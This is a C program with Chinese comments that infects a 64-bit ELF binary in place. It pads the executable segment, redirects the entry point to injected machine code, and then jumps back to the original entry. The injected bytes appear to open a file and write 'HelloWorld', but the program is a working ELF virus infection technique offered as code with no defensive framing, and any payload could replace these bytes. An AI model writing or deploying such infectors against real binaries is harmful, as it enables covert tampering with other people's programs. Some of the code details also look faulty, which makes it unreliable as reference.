#include <elf.h>
#include <stdio.h>
#define GET_ARRAY_LEN(array,len) {len = (sizeof(array) / sizeof(array[0]));}

void print_elfheader(Elf64_Ehdr * );
void cal_addr(int ,int *);

int main(int argc, char *argv[])
{
    //打开elf文件
    FILE *fp;
    fp=fopen(argv[1],"r");
    printf("打开文件:%s\n",argv[1]);

    //读取elf头
    Elf64_Ehdr elf_ehdr;
    fread(&elf_ehdr,sizeof(Elf64_Ehdr),1,fp);
    printf("读取elf头\n");

    //读取elf程序头并寻找可执行段编号
    Elf64_Phdr elf_phdr[elf_ehdr.e_phnum];
    fread(&elf_phdr,sizeof(Elf64_Phdr),elf_ehdr.e_phnum,fp);
    int ph_index;
    for(int i=0 ; i < elf_ehdr.e_phnum ; i++)
    {
        if(elf_phdr[i].p_vaddr <= elf_ehdr.e_entry && (elf_phdr[i].p_vaddr+elf_phdr[i].p_filesz) > elf_ehdr.e_entry)
        {
            ph_index=i;
            break;
        }
    }
    printf("读取elf程序头\n");
    printf("可执行段编号为 %d\n",ph_index);

    //读取节区头并获取可执行段最后一个节区编号
    fseek(fp,elf_ehdr.e_shoff,SEEK_SET);
    Elf64_Shdr elf_shdr[elf_ehdr.e_shnum];
    fread(&elf_shdr,sizeof(Elf64_Shdr),elf_ehdr.e_shnum,fp);
    int sh_index=0;
    for (int i = 0 ; i < elf_ehdr.e_shnum ; i++ )
    {
        if((elf_shdr[i].sh_size+elf_shdr[i].sh_addr)==(elf_phdr[ph_index].p_vaddr+elf_phdr[ph_index].p_filesz))
        {
            sh_index=i;
            break;
        }
    }
    printf("读取节区头\n");
    printf("可执行段最后一个节区编号为 %d\n",sh_index);

    //读取节区
    int buffer1_len=elf_shdr[sh_index].sh_offset+elf_shdr[sh_index].sh_size-elf_ehdr.e_phoff-sizeof(elf_phdr);
    printf("%x\n",buffer1_len+568);
    int buffer2_len=elf_ehdr.e_shoff-elf_shdr[sh_index].sh_offset-elf_shdr[sh_index].sh_size;
    printf("%x\n",buffer2_len);
    char buffer1[buffer1_len];
    char buffer2[buffer2_len];
    fseek(fp,elf_shdr[1].sh_offset,SEEK_SET);
    fread(&buffer1,buffer1_len,1,fp);
    fread(&buffer2,buffer2_len,1,fp);

    //嵌入代码的长度,应为相对于4096的倍数
    int insert_len=1*4096;

    //修改elf头
    int old_entry = elf_ehdr.e_entry;
    elf_ehdr.e_entry=elf_shdr[sh_index].sh_addr+elf_shdr[sh_index].sh_size;
    elf_ehdr.e_shoff+=insert_len;
    printf("修改elf头\n");

    //修改程序头
    elf_phdr[ph_index].p_filesz+=insert_len;
    elf_phdr[ph_index].p_memsz+=insert_len;
    for (int i =ph_index+1;i<elf_ehdr.e_phnum;i++)
    {
            elf_phdr[i].p_offset+=insert_len;

    }
    printf("修改程序头\n");

    //修改节区
    elf_shdr[sh_index].sh_size+=insert_len;
    for (int i= sh_index+1 ; i < elf_ehdr.e_shnum ; i++)
    {
            elf_shdr[i].sh_offset+=insert_len;
    }
    printf("修改节区\n");


    //重写elf文件并嵌入代码
    fclose(fp);
    fp=fopen(argv[1],"w");
    fwrite(&elf_ehdr,sizeof(Elf64_Ehdr),1,fp);
    fwrite(&elf_phdr,sizeof(elf_phdr),1,fp);
    fwrite(&buffer1,buffer1_len,1,fp);

    char nop[]={0x90};
    int arr[4];
    int d_arr[4];
    cal_addr(old_entry,arr);
    cal_addr(elf_ehdr.e_entry+71,d_arr);

    char parasize[]={
    0x50,                                       //pushq  %rax
    0x53,                                       //pushq  %rbx
    0x51,                                       //pushq  %rcx
    0x52,                                       //pushq  %rdx
    0x48, 0xc7, 0xc0, 0x05, 0x00, 0x00, 0x00,    //mov    $0x5,%rax
    0x48, 0xc7, 0xc3, d_arr[0], d_arr[1], d_arr[2], d_arr[3],    //mov    $0x6000fb,%rbx
    0x48, 0xc7, 0xc1, 0x66, 0x00, 0x00, 0x00,    //mov    $0x66,%rcx
    0x48, 0xc7, 0xc2, 0xb6, 0x01, 0x00, 0x00,    //mov    $0x1b6,%rdx
    0xcd, 0x80,                                  //int    $0x80
    0x48, 0x89, 0xc3,                            //mov    %rax,%rbx
    0x48, 0xc7, 0xc0, 0x04, 0x00, 0x00, 0x00,    //mov    $0x4,%rax
    0x48, 0xc7, 0xc1, d_arr[0], d_arr[1], d_arr[2], d_arr[3],    //mov    $0x6000f1,%rcx
    0x48, 0xc7, 0xc2, 0x0a, 0x00, 0x00, 0x00,           //mov    $0xa,%rdx
    0xcd, 0x80,                                         //int    $0x80
    0x5a,                                               //popq   %rax
    0x59,                                               //popq   %rbx
    0x5b,                                               //popq   %rcx
    0x58,                                               //popq   %rdx

    0xbd, arr[0], arr[1], arr[2], arr[3], 0xff, 0xe5,     //跳转指令

    0x48,0x65,0x6C,0x6C,0x6F,0x57,0x6F,0x72,0x6C,0x64,  //数据区域
    0x00
    };


    fwrite(&parasize,sizeof(parasize),1,fp);

    for (int i =0;i<insert_len-sizeof(parasize);i++)
    {
        fwrite(&nop,sizeof(nop),1,fp);
    }

    fwrite(&buffer2,buffer2_len,1,fp);
    fwrite(&elf_shdr,sizeof(elf_shdr),1,fp);
}

void cal_addr(int addr,int arr[])
{
    int a = addr/(16*16);
    int b = addr%(16*16);
    int a1 = a/(16*16);
    int b1 = a%(16*16);
    int a2= a1/(16*16);
    int b2=a1%(16*16);

    arr[0]=b;
    arr[1]=b1;
    arr[2]=b2;
    arr[3]=a2;
}

void print_elfheader(Elf64_Ehdr * elf_ehdr)
{

    for(int i=0;i<16;i++) printf("%x",elf_ehdr->e_ident[i]);
    printf("\n");
    printf("%hx\n", elf_ehdr->e_type);
    printf("%hx\n", elf_ehdr->e_machine);
    printf("%x\n",  elf_ehdr->e_version);
    printf("%lx\n", elf_ehdr->e_entry);
    printf("%lx\n", elf_ehdr->e_phoff);
    printf("%lx\n", elf_ehdr->e_shoff);
    printf("%x\n",  elf_ehdr->e_flags);
    printf("%hx\n", elf_ehdr->e_ehsize);
    printf("%hx\n", elf_ehdr->e_phentsize);
    printf("%hx\n", elf_ehdr->e_phnum);
    printf("%hx\n", elf_ehdr->e_shentsize);
    printf("%hx\n", elf_ehdr->e_shnum);
    printf("%hx\n", elf_ehdr->e_shstrndx);
}
